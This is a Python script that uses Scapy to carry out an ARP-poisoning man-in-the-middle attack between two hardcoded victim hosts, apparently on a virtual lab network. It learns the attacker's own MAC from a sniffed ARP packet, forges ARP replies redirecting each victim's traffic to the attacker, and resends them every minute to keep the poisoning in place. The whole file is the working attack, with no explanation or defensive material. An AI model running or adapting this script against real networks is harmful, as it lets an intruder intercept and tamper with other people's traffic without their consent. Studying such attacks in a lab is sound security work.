from scapy.all import *
import time
import threading

#icmp to capture
global icmp_packet_global

#victim1
macWindows = "08:00:27:b7:c4:af"
ipWindows = "192.168.56.101"

#victim2
macServer = "08:00:27:cc:08:6f"
ipServer = "192.168.56.102"

#find the mac and ip of the current device
def find_mac_ip(packet):
    if packet[0].haslayer(Ether):
        macc = packet[Ether].src
        ipp = packet[ARP].psrc

        return [macc, ipp]

def send_ping():
    icmp_packet = IP() / ICMP()
    icmp_packet[IP].dst = "192.168.56.102"

    send(icmp_packet)

#create arp package
def create_pack(macAttacker, ipToSpoof, ipVictim):
    arp = Ether() / ARP()
    arp[Ether].src = macAttacker
    arp[ARP].hwsrc = macAttacker
    arp[ARP].psrc = ipToSpoof
    arp[ARP].hwdst = "00:00:00:00:00:00"
    arp[ARP].pdst = ipVictim

    return arp

def sniff_icmp():
    global icmp_packet_global

    pkt = sniff(count=1, filter="arp")
    if len(pkt) > 0:
        icmp_packet_global = pkt[0]

#refresh arp tables in case victim updates itself
def maintain_arp_poison(arp1, arp2):
    while True:
        sendp(arp1, iface="enp0s3")
        sendp(arp2, iface="enp0s3")
        time.sleep(60)

if __name__ == "__main__":
    thread_sniff = threading.Thread(target=sniff_icmp)
    thread_sniff.start()
    send_ping()
    the_ar = find_mac_ip(icmp_packet_global)
    macAttacker = the_ar[0]
    ipAttacker = the_ar[1]

    arp1 = create_pack(macAttacker, ipServer, ipWindows)
    arp2 = create_pack(macAttacker, ipWindows, ipServer)
    thread_arp_poison = threading.Thread(target=maintain_arp_poison, args=(arp1, arp2))
    thread_arp_poison.start()
